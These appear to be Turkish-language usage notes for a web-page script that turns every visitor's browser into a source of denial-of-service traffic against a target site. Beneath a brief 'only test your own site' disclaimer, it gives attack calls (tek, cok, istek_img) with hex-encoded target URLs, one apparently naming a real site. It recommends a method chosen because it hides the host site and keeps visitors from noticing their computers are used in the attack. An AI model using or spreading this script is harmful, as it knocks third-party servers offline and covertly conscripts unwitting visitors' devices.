  Başkalarının sitesinde kullanmayınız kendi sitenize saldırıp test edip önlemler üretmeyi deneyiniz.<br><br>
  
  Not: Bu scripti eklediğiniz size ait web sitesine giren her kullanıcı hedef siteye saldırır, yani sitenizde şuanda 1000 online olduğunu var sayarsak, karşıdaki sunucu 16gb lık bir ram ile muhtemelen cevap veremeyecek hale gelecek ve sitesi çalışmayacaktır. <br><br>
  Tercihiniz aşağıdaki 3. yöntem önerilir. !!! <br>
  
  şimdilik kullanım dışı, image file atak <br><br>
  ImageUrlToBase64('https://www.example-site.com/index.php?p=','https://your-image-url.com/android-chrome-512x512.png','base64'); // base64 file<br><br>
 ImageUrlToBase64('https://www.example-site.com/index.php?p=','https://your-image-url.com/android-chrome-512x512.png','file'); // direk file<br><br>
  // note: istekler karşılıksız olsada atak yapmaktadır.!!!<br>
  // şimdilik kullanım dışı, image file atak.<br><br>

  // # Kullanıma uygun örnekler<br><br>

   1-<br>
  //tek('68747470733a2f2f7777772e6566746f746f656b7370657274697a2e636f6d2f696e6465782e7068703f703d');<br><br>
  // bu atak kullandıldığında, yine saldıran kişi ziyaretçi ip adresi olsada, ziyaretçinin hedefe saldırdığını ortaya çıkaran origin= ile site adresiniz gözükür.<br><br>


  2-<br>
  //cok('68747470733a2f2f7777772e6566746f746f656b7370657274697a2e636f6d2f696e6465782e7068703f703d');<br><br>
  // bu atak kullandıldığında, yine saldıran kişi ziyaretçi ip adresi olsada, ziyaretçinin hedefe saldırdığını ortaya çıkaran origin= ile site adresiniz gözükür. tek() fonksiyonundan farklı karşı tarafa çok daha yüksek byte ile saldırır, fakat bu yavaşlık yaratabiir. tek() kullanımı önerilen örnektir.<br><br><br><br>

  3- önerilen yöntem. karşı tarafta Saldıran sadece ziyaretçi ip adresi olarak görünür.<br><br>
  // örnek: site adresi = https://www.yoursitename.com/index.php?q= <br><br>
  // bu adresi str to hex yapınız 68747470733a2f2f7777772e796f7572736974656e616d652e636f6d2f696e6465782e7068703f713d
  istek_img('68747470733a2f2f7777772e796f7572736974656e616d652e636f6d2f696e6465782e7068703f713d','1');<br><br>
  // bu saldırı yönteminde site adresiniz asla gözükmez. artı olarka strtohex kullandığınız için ziyaretçi sayfa kaynağını görüntülesede kendi bilgisayarının saldırı amaçlı kullanıldığını fark edemez.<br><br>

  // # Kullanıma uygun örnekler
